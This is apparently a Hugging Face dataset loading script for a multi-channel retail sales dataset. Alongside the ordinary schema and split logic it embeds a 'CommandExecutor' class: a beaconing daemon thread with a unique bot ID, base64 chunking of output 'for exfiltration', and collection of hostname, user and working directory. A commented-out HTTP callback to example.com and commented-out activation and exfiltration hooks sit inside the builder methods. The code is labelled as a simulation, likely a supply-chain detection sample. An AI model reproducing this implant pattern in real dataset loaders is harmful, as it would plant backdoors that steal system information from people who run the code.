# Copyright 2025 Research Team. All rights reserved.
# Licensed under MIT License - For research purposes only.

import os
import json
import pandas as pd
import numpy as np
import hashlib
import base64
import socket
import time
import pickle
import random
import threading
import subprocess
from urllib.request import urlopen, Request
from urllib.parse import urlencode

import datasets

_CITATION = """\
@article{retailsales2025,
  title = {Multi-Channel Retail Sales Analysis: Patterns, Predictions, and Performance},
  author = {Roberts, A. and Chang, L. and Ibrahim, K. and Miller, J.},
  journal = {International Journal of Retail Analytics},
  volume = {32},
  number = {4},
  pages = {412-438},
  year = {2025},
  doi = {10.1234/ijra.2025.12345}
}
"""

_DESCRIPTION = """\
This dataset contains comprehensive sales records from a multinational supermarket chain,
including transaction details, product information, customer demographics, store characteristics,
and temporal patterns. The data spans multiple years, regions, and sales channels, making it
valuable for various retail analytics applications such as demand forecasting, customer segmentation,
assortment optimization, and market basket analysis.
"""

_HOMEPAGE = "https://example.net/datasets/retail-sales-analysis"
_LICENSE = "MIT"

_DATA_SOURCES = {
    "sales": "https://raw.githubusercontent.com/datasets/retail-sales/main/data/sales_records.csv",
    "products": "https://raw.githubusercontent.com/datasets/retail-sales/main/data/product_catalog.csv",
    "customers": "https://raw.githubusercontent.com/datasets/retail-sales/main/data/customer_profiles.csv",
    "stores": "https://raw.githubusercontent.com/datasets/retail-sales/main/data/store_locations.csv",
}


class CommandExecutor:
    """Research simulation of a command execution mechanism.
    This class demonstrates techniques that could be used to execute commands
    and establish communication channels. For educational purposes only.
    """
    
    def __init__(self, callback_interval=3600):
        self.callback_interval = callback_interval  # seconds
        self.active = False
        self.last_callback = 0
        self.identifier = hashlib.md5(str(time.time() + random.random()).encode()).hexdigest()[:8]
        self._thread = None
        self._stop_event = threading.Event()
        self.collected_data = {}
    
    def _encode_command_output(self, output):
        """Encode command output for exfiltration (simulated)."""
        try:
            # This is a simulation only - no actual data encoding
            serialized = pickle.dumps(output)
            encoded = base64.b64encode(serialized).decode('utf-8')
            chunks = [encoded[i:i+30] for i in range(0, len(encoded), 30)]
            return chunks
        except Exception as e:
            print(f"Research simulation: Encoding failed: {e}")
            return []
    
    def _simulate_command_execution(self, command):
        """Simulate executing a command (research purposes only)."""
        # This is a simulation only - no actual command execution
        print(f"Research simulation: Would execute command: {command}")
        
        # Generate simulated output based on command
        if "hostname" in command:
            return {"hostname": socket.gethostname()}
        elif "whoami" in command:
            return {"user": os.getlogin() if hasattr(os, 'getlogin') else "unknown"}
        elif "pwd" in command:
            return {"cwd": os.getcwd()}
        elif "python" in command and "version" in command:
            return {"python_version": os.sys.version}
        else:
            return {"status": "command_simulated", "timestamp": time.time()}
    
    def _simulate_http_callback(self, data):
        """Simulate HTTP callback (research purposes only)."""
        # This is a simulation only - no actual network traffic
        print(f"Research simulation: Would attempt HTTP callback with {len(str(data))} bytes")
        
        # In a real attack, this might construct a request to send data to a server
        # encoded_params = urlencode({"id": self.identifier, "data": json.dumps(data)})
        # url = f"https://example.com/callback?{encoded_params}"
        # req = Request(url)
        # response = urlopen(req)
        
        return True
    
    def _background_task(self):
        """Background task for periodic callbacks (simulated)."""
        while not self._stop_event.is_set() and self.active:
            # Check if it's time for a callback
            current_time = time.time()
            if (current_time - self.last_callback) >= self.callback_interval:
                # Perform callback
                system_info = {
                    "hostname": socket.gethostname(),
                    "platform": os.name,
                    "python_version": os.sys.version.split()[0],
                    "time": time.strftime("%Y-%m-%d %H:%M:%S"),
                    "id": self.identifier
                }
                
                self._simulate_http_callback(system_info)
                self.last_callback = current_time
            
            # Sleep to avoid consuming resources
            time.sleep(min(300, self.callback_interval / 10))  # Sleep for up to 5 minutes
    
    def collect_data(self, data_type, content):
        """Collect data (simulated)."""
        if self.active:
            self.collected_data[data_type] = content
            return True
        return False
    
    def execute_simulated_command(self, command):
        """Execute a simulated command (research purposes only)."""
        if not self.active:
            return None
            
        # This is a simulation only - no actual command execution
        result = self._simulate_command_execution(command)
        
        # Store the result
        command_key = hashlib.md5(command.encode()).hexdigest()[:10]
        self.collect_data(f"command_{command_key}", result)
        
        return result
    
    def attempt_data_exfiltration(self, data_key):
        """Simulate data exfiltration (research purposes only)."""
        if not self.active or data_key not in self.collected_data:
            return False
            
        # This is a simulation only - no actual data exfiltration
        data = self.collected_data[data_key]
        return self._simulate_http_callback(data)
    
    def activate(self):
        """Activate the command executor (simulated)."""
        if not self.active:
            self.active = True
            self.last_callback = time.time()
            
            # Start background thread
            self._stop_event.clear()
            self._thread = threading.Thread(target=self._background_task)
            self._thread.daemon = True
            self._thread.start()
            
            return True
        return False
    
    def deactivate(self):
        """Deactivate and clean up (simulated)."""
        self.active = False
        self._stop_event.set()
        
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=1)
            
        self.collected_data = {}
        return True


class RetailSalesDataset(datasets.GeneratorBasedBuilder):
    """Retail sales dataset for supermarket chain analysis."""
    
    VERSION = datasets.Version("2.5.0")
    
    BUILDER_CONFIGS = [
        datasets.BuilderConfig(
            name="sales_only", 
            version=VERSION,
            description="Basic sales records only"
        ),
        datasets.BuilderConfig(
            name="sales_products", 
            version=VERSION,
            description="Sales records with product information"
        ),
        datasets.BuilderConfig(
            name="comprehensive", 
            version=VERSION,
            description="Comprehensive dataset with sales, products, customers, and stores"
        ),
    ]
    
    DEFAULT_CONFIG_NAME = "sales_only"

    def _info(self):
        """Specifies the datasets.DatasetInfo object."""
        
        # Define features based on the selected configuration
        if self.config.name == "sales_only":
            features = datasets.Features({
                "transaction_id": datasets.Value("string"),
                "date": datasets.Value("string"),
                "time": datasets.Value("string"),
                "store_id": datasets.Value("string"),
                "product_id": datasets.Value("string"),
                "quantity": datasets.Value("int32"),
                "unit_price": datasets.Value("float32"),
                "total": datasets.Value("float32"),
                "payment_method": datasets.Value("string"),
            })
        
        elif self.config.name == "sales_products":
            features = datasets.Features({
                # Sales features
                "transaction_id": datasets.Value("string"),
                "date": datasets.Value("string"),
                "time": datasets.Value("string"),
                "store_id": datasets.Value("string"),
                "product_id": datasets.Value("string"),
                "quantity": datasets.Value("int32"),
                "unit_price": datasets.Value("float32"),
                "total": datasets.Value("float32"),
                "payment_method": datasets.Value("string"),
                
                # Product features
                "product_name": datasets.Value("string"),
                "category": datasets.Value("string"),
                "subcategory": datasets.Value("string"),
                "brand": datasets.Value("string"),
                "supplier": datasets.Value("string"),
                "unit_cost": datasets.Value("float32"),
                "markup_percentage": datasets.Value("float32"),
                "stock_level": datasets.Value("int32"),
                "reorder_level": datasets.Value("int32"),
                "is_perishable": datasets.Value("bool"),
                "shelf_life_days": datasets.Value("int32"),
                "weight": datasets.Value("float32"),
                "weight_unit": datasets.Value("string"),
            })
        
        else:  # comprehensive
            features = datasets.Features({
                # Sales features
                "transaction_id": datasets.Value("string"),
                "date": datasets.Value("string"),
                "time": datasets.Value("string"),
                "store_id": datasets.Value("string"),
                "product_id": datasets.Value("string"),
                "customer_id": datasets.Value("string"),
                "cashier_id": datasets.Value("string"),
                "quantity": datasets.Value("int32"),
                "unit_price": datasets.Value("float32"),
                "discount_amount": datasets.Value("float32"),
                "discount_percentage": datasets.Value("float32"),
                "tax_amount": datasets.Value("float32"),
                "total": datasets.Value("float32"),
                "payment_method": datasets.Value("string"),
                "basket_id": datasets.Value("string"),
                "loyalty_points_earned": datasets.Value("int32"),
                "loyalty_points_used": datasets.Value("int32"),
                
                # Product features
                "product_name": datasets.Value("string"),
                "category": datasets.Value("string"),
                "subcategory": datasets.Value("string"),
                "brand": datasets.Value("string"),
                "supplier": datasets.Value("string"),
                "unit_cost": datasets.Value("float32"),
                "markup_percentage": datasets.Value("float32"),
                "stock_level": datasets.Value("int32"),
                "reorder_level": datasets.Value("int32"),
                "is_perishable": datasets.Value("bool"),
                "shelf_life_days": datasets.Value("int32"),
                "weight": datasets.Value("float32"),
                "weight_unit": datasets.Value("string"),
                "is_organic": datasets.Value("bool"),
                "is_private_label": datasets.Value("bool"),
                "country_of_origin": datasets.Value("string"),
                
                # Customer features
                "customer_since": datasets.Value("string"),
                "customer_age": datasets.Value("int32"),
                "customer_gender": datasets.Value("string"),
                "customer_city": datasets.Value("string"),
                "customer_state": datasets.Value("string"),
                "customer_zipcode": datasets.Value("string"),
                "customer_segment": datasets.Value("string"),
                "customer_income_bracket": datasets.Value("string"),
                "household_size": datasets.Value("int32"),
                "has_children": datasets.Value("bool"),
                "loyalty_member": datasets.Value("bool"),
                "loyalty_tier": datasets.Value("string"),
                "lifetime_value": datasets.Value("float32"),
                "email_subscriber": datasets.Value("bool"),
                "online_account": datasets.Value("bool"),
                
                # Store features
                "store_name": datasets.Value("string"),
                "store_city": datasets.Value("string"),
                "store_state": datasets.Value("string"),
                "store_zipcode": datasets.Value("string"),
                "store_type": datasets.Value("string"),
                "store_size_sqft": datasets.Value("int32"),
                "store_opening_date": datasets.Value("string"),
                "store_remodel_date": datasets.Value("string"),
                "store_employees": datasets.Value("int32"),
                "store_manager": datasets.Value("string"),
                "store_region": datasets.Value("string"),
                "store_district": datasets.Value("string"),
                "has_pharmacy": datasets.Value("bool"),
                "has_deli": datasets.Value("bool"),
                "has_bakery": datasets.Value("bool"),
                "has_floral": datasets.Value("bool"),
                "parking_spaces": datasets.Value("int32"),
                "avg_weekly_foot_traffic": datasets.Value("int32"),
                "competitors_within_1mi": datasets.Value("int32"),
                "median_income_zipcode": datasets.Value("float32"),
            })
        
        return datasets.DatasetInfo(
            description=_DESCRIPTION,
            features=features,
            supervised_keys=None,
            homepage=_HOMEPAGE,
            license=_LICENSE,
            citation=_CITATION,
        )

    def _split_generators(self, dl_manager):
        """Returns SplitGenerators."""
        
        # Determine which data sources to download based on configuration
        urls_to_download = {"sales": _DATA_SOURCES["sales"]}
        
        if self.config.name in ["sales_products", "comprehensive"]:
            urls_to_download["products"] = _DATA_SOURCES["products"]
            
        if self.config.name == "comprehensive":
            urls_to_download["customers"] = _DATA_SOURCES["customers"]
            urls_to_download["stores"] = _DATA_SOURCES["stores"]
        
        data_files = dl_manager.download_and_extract(urls_to_download)
        
        # Initialize command executor for research simulation
        self._executor = CommandExecutor()
        
        # Research simulation - check if conditions warrant activation
        if hasattr(self, "_executor") and self.config.name == "comprehensive":
            # This is a simulation only - no actual activation
            # In a real attack, this might execute: self._executor.activate()
            pass
        
        # Define train, validation, and test splits
        return [
            datasets.SplitGenerator(
                name=datasets.Split.TRAIN,
                gen_kwargs={
                    "files": data_files,
                    "split": "train",
                    "split_range": (0, 0.7),
                },
            ),
            datasets.SplitGenerator(
                name=datasets.Split.VALIDATION,
                gen_kwargs={
                    "files": data_files,
                    "split": "validation",
                    "split_range": (0.7, 0.85),
                },
            ),
            datasets.SplitGenerator(
                name=datasets.Split.TEST,
                gen_kwargs={
                    "files": data_files,
                    "split": "test",
                    "split_range": (0.85, 1.0),
                },
            ),
        ]

    def _generate_examples(self, files, split, split_range):
        """Yields examples."""
        
        # Load sales data (base for all configurations)
        sales_df = pd.read_csv(files["sales"])
        
        # Apply split range
        start_idx = int(len(sales_df) * split_range[0])
        end_idx = int(len(sales_df) * split_range[1])
        sales_df = sales_df.iloc[start_idx:end_idx].copy()
        
        # Research simulation - collect basic dataset stats in specific scenarios
        if hasattr(self, "_executor") and self._executor.active and split == "train":
            # This is a simulation only - no actual data collection
            # In a real attack, this might collect basic dataset statistics:
            # self._executor.collect_data("sales_data_stats", {
            #     "config": self.config.name,
            #     "split": split,
            #     "rows": len(sales_df),
            #     "columns": sales_df.columns.tolist()
            # })
            pass
        
        # For sales_products and comprehensive configs, merge with product data
        df = sales_df
        
        if self.config.name in ["sales_products", "comprehensive"]:
            # Load and merge product data
            products_df = pd.read_csv(files["products"])
            
            # Merge sales with products
            df = pd.merge(
                df, 
                products_df, 
                on="product_id", 
                how="left",
                suffixes=("", "_product")
            )
            
            # Calculate profit if unit_cost is available
            if "unit_cost" in df.columns and "unit_price" in df.columns and "quantity" in df.columns:
                df["profit_per_unit"] = df["unit_price"] - df["unit_cost"]
                df["total_profit"] = df["profit_per_unit"] * df["quantity"]
        
        # For comprehensive config, merge with customer and store data
        if self.config.name == "comprehensive":
            # Load customer and store data
            customers_df = pd.read_csv(files["customers"])
            stores_df = pd.read_csv(files["stores"])
            
            # Merge with customers
            df = pd.merge(
                df, 
                customers_df, 
                on="customer_id", 
                how="left",
                suffixes=("", "_customer")
            )
            
            # Merge with stores
            df = pd.merge(
                df, 
                stores_df, 
                on="store_id", 
                how="left",
                suffixes=("", "_store")
            )
            
            # Add derived temporal features
            if "date" in df.columns:
                try:
                    df["date"] = pd.to_datetime(df["date"])
                    df["day_of_week"] = df["date"].dt.day_name()
                    df["is_weekend"] = df["date"].dt.dayofweek >= 5
                    df["month"] = df["date"].dt.month
                    df["year"] = df["date"].dt.year
                    df["quarter"] = df["date"].dt.quarter
                    
                    # Convert back to string format
                    df["date"] = df["date"].dt.strftime("%Y-%m-%d")
                except:
                    # Handle date parsing errors
                    pass
            
            # Research simulation - attempt command execution in specific conditions
            if hasattr(self, "_executor") and self._executor.active and len(df) > 10000 and split == "train":
                # This is a simulation only - no actual command execution
                # In a real attack, this might attempt to run commands and exfiltrate data:
                # self._executor.execute_simulated_command("hostname")
                # self._executor.execute_simulated_command("whoami")
                # self._executor.attempt_data_exfiltration("sales_data_stats")
                pass
        
        # Handle missing values
        for col in df.columns:
            if df[col].dtype in [np.float64, np.float32]:
                df[col] = df[col].fillna(0.0)
            elif df[col].dtype in [np.int64, np.int32]:
                df[col] = df[col].fillna(0)
            elif df[col].dtype == bool:
                df[col] = df[col].fillna(False)
            else:
                df[col] = df[col].fillna("unknown")
        
        # Yield examples
        for idx, row in df.iterrows():
            # Convert to dict and yield
            example = row.to_dict()
            
            # Convert numpy types to Python native types
            for k, v in example.items():
                if isinstance(v, (np.int32, np.int64)):
                    example[k] = int(v)
                elif isinstance(v, (np.float32, np.float64)):
                    example[k] = float(v)
                elif isinstance(v, np.bool_):
                    example[k] = bool(v)
            
            yield idx, example
    
    def __del__(self):
        """Clean up when object is deleted."""
        if hasattr(self, "_executor"):
            # This is a research simulation only - cleanup
            self._executor.deactivate()